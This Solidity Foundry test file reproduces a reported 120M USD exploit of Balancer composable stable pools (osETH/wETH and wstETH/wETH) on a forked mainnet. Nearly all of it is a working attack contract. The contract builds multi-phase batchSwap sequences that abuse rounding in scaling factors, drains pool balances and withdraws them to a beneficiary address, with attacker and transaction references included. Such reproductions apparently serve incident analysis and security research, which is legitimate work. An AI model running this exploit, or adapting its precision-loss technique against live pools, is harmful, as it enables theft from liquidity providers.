pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../interface.sol";
import "../StableMath.sol";

// @KeyInfo - Total Lost : 120M USD
// Attacker : https://etherscan.io/address/0x506d1f9efe24f0d47853adca907eb8d89ae03207
// Attack Contract : https://etherscan.io/address/0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d
// Vulnerable Contract : 
// Attack Tx: https://app.blocksec.com/explorer/tx/eth/0x6ed07db1a9fe5c0794d44cd36081d6a6df103fab868cdd75d581e3bd23bc9742
// Withdrawal Tx: https://app.blocksec.com/explorer/tx/eth/0xd155207261712c35fa3d472ed1e51bfcd816e616dd4f517fa5959836f5b48569

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : https://x.com/BlockSecTeam/status/1986057732810518640, https://x.com/SlowMist_Team/status/1986379316935205299, https://x.com/hklst4r/status/1985872151077953827
// Twitter Guy : https://x.com/BlockSecTeam/status/1986057732810518640, https://x.com/SlowMist_Team/status/1986379316935205299, https://x.com/hklst4r/status/1985872151077953827
// Hacking God : N/A

address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant balancer = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant osETH_wETH = 0xDACf5Fa19b1f720111609043ac67A9818262850c;
address constant wstETH_wETH = 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD;
address constant osToken = 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
address constant attacker = 0x506D1f9EFe24f0d47853aDca907EB8d89AE03207;
address constant beneficiary = 0xAa760D53541d8390074c61DEFeaba314675b8e3f;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 23717397 - 1);
    }

    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of address(beneficiary)", IERC20(weth).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("before attack: balance of address(beneficiary)", IERC20(osETH_wETH).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("before attack: balance of address(beneficiary)", IERC20(osToken).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("before attack: balance of address(beneficiary)", IERC20(wstETH).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("before attack: balance of address(beneficiary)", IERC20(wstETH_wETH).balanceOf(address(beneficiary)), 18);
        // vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        attC.attack(osETH_wETH, 67000, 30); // offline computing numbers
        attC.withdraw(osETH_wETH);

        attC.attack(wstETH_wETH, 100000000000, 25); // offline computing numbers
        attC.withdraw(wstETH_wETH);
        // vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of address(beneficiary)", IERC20(weth).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("after attack: balance of address(beneficiary)", IERC20(osETH_wETH).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("after attack: balance of address(beneficiary)", IERC20(osToken).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("after attack: balance of address(beneficiary)", IERC20(wstETH).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("after attack: balance of address(beneficiary)", IERC20(wstETH_wETH).balanceOf(address(beneficiary)), 18);
    }
}

contract Helper {
    using FixedPoint for uint256;

    function swapGivenOut(
        uint256[] memory balances,        
        uint256[] memory scalingFactors,  
        uint256 tokenIndexIn,             
        uint256 tokenIndexOut,            
        uint256 tokenAmountOut,                
        uint256 amplificationParameter,                      
        uint256 swapFee                   
    ) public view returns (uint256[] memory) {
        uint256 n = balances.length;
        uint256[] memory balanceScaled = new uint256[](n);
        for (uint256 i = 0; i < n; i++) {
            balanceScaled[i] = FixedPoint.mulDown(balances[i], scalingFactors[i]);
        }

        uint256 invariant = StableMath._calculateInvariant(amplificationParameter, balanceScaled);
        uint256 amountOutScaled = FixedPoint.mulDown(tokenAmountOut, scalingFactors[tokenIndexOut]); // precision loss here
        uint256 amountInScaled = StableMath._calcInGivenOut(
            amplificationParameter,
            balanceScaled,
            tokenIndexIn,
            tokenIndexOut,
            amountOutScaled,
            invariant
        );
        uint256 rawAmountIn = FixedPoint.divUp(amountInScaled, scalingFactors[tokenIndexIn]);
        uint256 amountInWithFee = FixedPoint.divUp(rawAmountIn, FixedPoint.ONE.sub(swapFee));

        balances[tokenIndexOut] = balances[tokenIndexOut].sub(tokenAmountOut);
        balances[tokenIndexIn] = balances[tokenIndexIn].add(amountInWithFee);
        
        return balances;
    }


    function get_trickAmt(uint256 scalingfactor) public pure returns (uint256 trickAmt) {
        trickAmt = 10000 / ((scalingfactor - 1e18) * 10000 / 1e18);
        return trickAmt;
    }

    function get_index(
        address[] memory tokens, 
        uint256[] memory balances,
        uint256 BptIndex
    ) public returns (uint256 idx) {
        uint256 idx = 0;
        uint256 maxbalance = balances[idx];
        for (uint256 i = 1; i < tokens.length; i++) {
            if (i == BptIndex) continue;
            if (balances[i] > maxbalance) {
                maxbalance = balances[i];
                idx = i;
            }
        }
        return idx;
    }


    function concat_steps(
        IBalancerVault.BatchSwapStep[] memory a,
        IBalancerVault.BatchSwapStep[] memory b
    ) public returns (IBalancerVault.BatchSwapStep[] memory) {
        IBalancerVault.BatchSwapStep[] memory c = new IBalancerVault.BatchSwapStep[](
            a.length + b.length
        );
        uint256 k = 0;
        for (uint256 i = 0; i < a.length; i++) c[k++] = a[i];
        for (uint256 i = 0; i < b.length; i++) c[k++] = b[i];
        return c;
    }

    function get_amount(uint256 actualSupply) public pure returns (uint256) {
        uint256 a = uint256(actualSupply * 10030 / 10000);

        return uint256((a - get_base(a)) / 2) + 1;
    }


    function get_base(uint256 v) public pure returns (uint256) {
        uint base = 1e4;
        while (base * 1e3 < v) base = base * 1e3;
        return base;
    }

    function trim(uint256 n) public pure returns (uint256) {
        if (n < 100) return n;

        uint256 initBalance = n;
        uint256 pow = 1;

        while (initBalance > 100) {
            initBalance = initBalance / 10;
            pow = pow * 10;
        }
        return n / pow * pow;
    }

}

// 0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d
contract AttackerC {
    Helper public helper = new Helper();
    
    uint256 constant MAX_STEPS = 300;

    function prepare_phase1_steps(
        bytes32 poolId,
        address[] memory tokens, 
        uint256[] memory balances,
        uint256 BptIndex,
        uint256 initBalance
    ) public returns (IBalancerVault.BatchSwapStep[] memory steps) {
        IBalancerVault.BatchSwapStep[] memory buffer = new IBalancerVault.BatchSwapStep[](MAX_STEPS);
        uint256[] memory preAmount = new uint256[](tokens.length);
        uint256[] memory sumAmounts = new uint256[](tokens.length);

        uint256 amount;
        uint256 nextAmount;
        bool exit = false;
        uint256 stepCount = 0;
        while (!exit) {
            for (uint256 assetOutIndex = 0; assetOutIndex < tokens.length; assetOutIndex++) {
                if (assetOutIndex == BptIndex) continue;
                if (preAmount[assetOutIndex] == 0) {
                    amount = 99 * balances[assetOutIndex] - 99 * initBalance;
                } else {
                    amount = preAmount[assetOutIndex] - 99 * uint256(preAmount[assetOutIndex] / 100);
                }
                preAmount[assetOutIndex] = amount;
                amount = amount / 100;
                nextAmount = preAmount[assetOutIndex] - 99 * uint256(preAmount[assetOutIndex] / 100);
                if (nextAmount < 100) {
                    exit = true;
                    amount = balances[assetOutIndex] - sumAmounts[assetOutIndex] - initBalance;
                } else {
                    sumAmounts[assetOutIndex] += amount;
                }
            
                buffer[stepCount] = IBalancerVault.BatchSwapStep({
                    poolId: poolId,
                    assetInIndex: BptIndex, // BPT
                    assetOutIndex: assetOutIndex,
                    amount: amount,
                    userData: bytes("")
                });

                stepCount++;
            }
        }

        IBalancerVault.BatchSwapStep[] memory steps = new IBalancerVault.BatchSwapStep[](stepCount);
        for (uint256 i = 0; i < stepCount; i++) {
            steps[i] = buffer[i];
        }

        return steps;
    }

    function prepare_phase2_steps(
        bytes32 poolId,
        uint256[] memory scalingFactors,  
        uint256 amplificationParameter,                      
        uint256 swapFee,
        uint256 maxRounds,
        uint256 initBalance,
        uint256 trickAmt,
        uint256 tokenIndexIn,
        uint256 tokenIndexOut,
        uint256 indexIn,
        uint256 indexOut
    ) public returns (IBalancerVault.BatchSwapStep[] memory steps) {
        IBalancerVault.BatchSwapStep[] memory buffer = new IBalancerVault.BatchSwapStep[](MAX_STEPS);
        uint256[] memory balances = new uint256[](2);
        balances[0] = initBalance;
        balances[1] = initBalance;
        uint256 amount = balances[1];
        uint256 stepCount = 0;
        for (uint256 round = 0; round < maxRounds; ++round) {
            balances = helper.swapGivenOut(balances, scalingFactors, tokenIndexIn, tokenIndexOut, amount - trickAmt - 1, amplificationParameter, swapFee);
            buffer[stepCount++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: indexIn,
                assetOutIndex: indexOut,
                amount: amount - trickAmt - 1,
                userData: bytes("")
            });

            balances = helper.swapGivenOut(balances, scalingFactors, tokenIndexIn, tokenIndexOut, trickAmt, amplificationParameter, swapFee);
            buffer[stepCount++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: indexIn,
                assetOutIndex: indexOut,
                amount: trickAmt,
                userData: bytes("")
            });
            amount = helper.trim(balances[tokenIndexIn]);
            for (uint256 j = 0; j < 3; ++j) {
                try helper.swapGivenOut(balances, scalingFactors, tokenIndexOut, tokenIndexIn, amount, amplificationParameter, swapFee) returns (uint256[] memory newBalances) {
                    buffer[stepCount++] = IBalancerVault.BatchSwapStep({
                        poolId: poolId,
                        assetInIndex: indexOut,
                        assetOutIndex: indexIn,
                        amount: amount,
                        userData: bytes("")
                    });
                    balances = newBalances;
                    amount = balances[tokenIndexOut];
                    break;
                } catch {
                    amount = (amount * 9) / 10;
                    continue;
                }
            }
        }

        IBalancerVault.BatchSwapStep[] memory steps = new IBalancerVault.BatchSwapStep[](stepCount);
        for (uint256 i = 0; i < stepCount; ++i) {
            steps[i] = buffer[i];
        }

        return steps;
    }

    function prepare_phase3_steps(
        bytes32 poolId,
        uint256 actualSupply
    ) public returns (IBalancerVault.BatchSwapStep[] memory steps) {
        IBalancerVault.BatchSwapStep[] memory buffer = new IBalancerVault.BatchSwapStep[](MAX_STEPS);
        uint256 amount = 1e4;
        uint256 stepCount = 0;
        for (uint256 round = 0; round < 3; ++round) {
            buffer[stepCount++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 0,
                assetOutIndex: 1,
                amount: amount,
                userData: bytes("")
            });
            amount = amount * 1e3;
            buffer[stepCount++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 2,
                assetOutIndex: 1,
                amount: amount,
                userData: bytes("")
            });
            amount = amount * 1e3;
        }

        buffer[stepCount++] = IBalancerVault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: 0,
            assetOutIndex: 1,
            amount: amount,
            userData: bytes("")
        });
        amount = helper.get_amount(actualSupply);
        // console.log("phase 3 step amount", amount);
        buffer[stepCount++] = IBalancerVault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: 2,
            assetOutIndex: 1,
            amount: amount,
            userData: bytes("")
        });
        buffer[stepCount++] = IBalancerVault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: 0,
            assetOutIndex: 1,
            amount: amount,
            userData: bytes("")
        });

        IBalancerVault.BatchSwapStep[] memory steps = new IBalancerVault.BatchSwapStep[](stepCount);
        for (uint256 i = 0; i < stepCount; ++i) {
            steps[i] = buffer[i];
        }

        return steps;
    }

    // https://etherscan.io/tx/0x6ed07db1a9fe5c0794d44cd36081d6a6df103fab868cdd75d581e3bd23bc9742
    function attack(address pool, uint256 initBalance, uint256 loops) public {
        bytes32 poolId = IComposableStablePool(pool).getPoolId(); 
        uint256 BptIndex = IComposableStablePool(pool).getBptIndex(); 
        (address[] memory tokens, uint256[] memory startBalances, uint256 startBlock) = IBalancerVault(balancer).getPoolTokens(poolId); 

        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20(address(tokens[i])).approve(balancer, type(uint256).max);
        }

        uint256[] memory scalingFactors = IComposableStablePool(pool).getScalingFactors(); 
        uint256 idx = helper.get_index(tokens, startBalances, BptIndex);
        IComposableStablePool(pool).updateTokenRateCache(tokens[idx]);
        uint256 trickAmt = helper.get_trickAmt(scalingFactors[idx]);
        uint256 indexIn = 0;
        uint256 indexOut = 2;
        
        uint256 tokenIndexIn = 0;
        uint256 tokenIndexOut = 1;

        if (idx == 0) {
            indexIn = 2;
            indexOut = 0;
        
            tokenIndexIn = 1;
            tokenIndexOut = 0; 
        }

        (uint256 amplificationParameter, bool isUpdating, uint256 precision) = IComposableStablePool(pool).getAmplificationParameter(); 
        uint256 swapFeePercentage = IComposableStablePool(pool).getSwapFeePercentage();
        uint256 rate = IComposableStablePool(pool).getRate(); 
        (, uint256[] memory balances, uint256 lastChangeBlock) = IBalancerVault(balancer).getPoolTokens(poolId); 
        uint256 actualSupply = IComposableStablePool(pool).getActualSupply(); 
        scalingFactors = IComposableStablePool(pool).getScalingFactors(); 

        IBalancerVault.BatchSwapStep[] memory phase1steps = prepare_phase1_steps(
            poolId,
            tokens,
            balances,
            BptIndex,
            initBalance
        );
        // except the bpt token
        uint256[] memory newScalingFactors = new uint256[](2);
        newScalingFactors[0] = scalingFactors[0];
        newScalingFactors[1] = scalingFactors[2];
         
        IBalancerVault.BatchSwapStep[] memory phase2steps = prepare_phase2_steps(
            poolId,
            newScalingFactors,
            amplificationParameter,
            swapFeePercentage,
            loops,
            initBalance,
            trickAmt,
            tokenIndexIn,
            tokenIndexOut,
            indexIn,
            indexOut
        );

        IBalancerVault.BatchSwapStep[] memory phase3steps = prepare_phase3_steps(
            poolId,
            actualSupply
        );
        IBalancerVault.BatchSwapStep[] memory steps = helper.concat_steps(
            helper.concat_steps(phase1steps, phase2steps), 
            phase3steps
        );

        int256[] memory limits = new int256[](3);
        limits[0] = 0x400000000000000000000000000000000000000000000000000000000000000;
        limits[1] = 0x400000000000000000000000000000000000000000000000000000000000000;
        limits[2] = 0x400000000000000000000000000000000000000000000000000000000000000;
        
        IBalancerVault(balancer).batchSwap(IBalancerVault.SwapKind.GIVEN_OUT, steps, tokens, IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: true,
            recipient: payable(address(this)),
            toInternalBalance: true
        }), limits, block.timestamp);
    }

    // https://etherscan.io/tx/0xd155207261712c35fa3d472ed1e51bfcd816e616dd4f517fa5959836f5b48569
    function withdraw(address pool) public {
        bytes32 poolId = IComposableStablePool(pool).getPoolId(); // 0xdacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635
        (address[] memory tokens, uint256[] memory startBalances, uint256 startBlock) = IBalancerVault(balancer).getPoolTokens(poolId); //
        (uint256[] memory balances) = IBalancerVault(balancer).getInternalBalance(address(this), tokens);

        IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](tokens.length);
        for (uint256 i = 0; i < tokens.length; i++) {
            ops[i] = IBalancerVault.UserBalanceOp({
                kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                asset: tokens[i],
                amount: balances[i],
                sender: address(this),
                recipient: payable(beneficiary)
            });
        }

        IBalancerVault(balancer).manageUserBalance(ops);
    }
}

interface IComposableStablePool {
	function getPoolId() external returns (bytes32);
    function getBptIndex() external returns (uint256);
    function approve(address, uint256) external returns (bool);
    function getScalingFactors() external returns (uint256[] memory);
    function getRateProviders() external returns (address[] memory);
    function updateTokenRateCache(address) external;
    function getAmplificationParameter() external returns (uint256, bool, uint256);
    function getSwapFeePercentage() external returns (uint256);
    function getRate() external returns (uint256);
    function getActualSupply() external returns (uint256);
	function balanceOf(address) external returns (uint256); 
}
